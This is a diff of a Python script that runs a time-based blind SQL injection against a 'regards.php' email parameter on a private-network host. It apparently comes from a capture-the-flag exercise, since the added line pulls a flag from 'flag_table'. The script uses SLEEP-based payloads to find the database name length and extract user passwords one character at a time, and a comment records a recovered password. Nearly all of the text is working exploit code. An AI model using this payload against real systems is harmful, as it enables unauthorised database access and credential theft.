@@ -13,7 +13,7 @@ for i in range(1, 40):
     for char in chars:
 
 
-        target = "http://10.102.126.109/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
+        target = "http://10.102.181.239/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
         target = target.replace("SLEEP(5)", "IF(LENGTH(DATABASE())='7', SLEEP(1), SLEEP(0))")
 
 
@@ -22,6 +22,7 @@ for i in range(1, 40):
         query = "SUBSTRING((SELECT password FROM users LIMIT 0,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu
         query = "SUBSTRING((SELECT password FROM users LIMIT 1,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu
         query = "SUBSTRING((SELECT password FROM users LIMIT 2,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu
+        query = "SUBSTRING((SELECT flag FROM flag_table LIMIT 0,1),{},1)='{}'".format(i, char) 
 
 
 
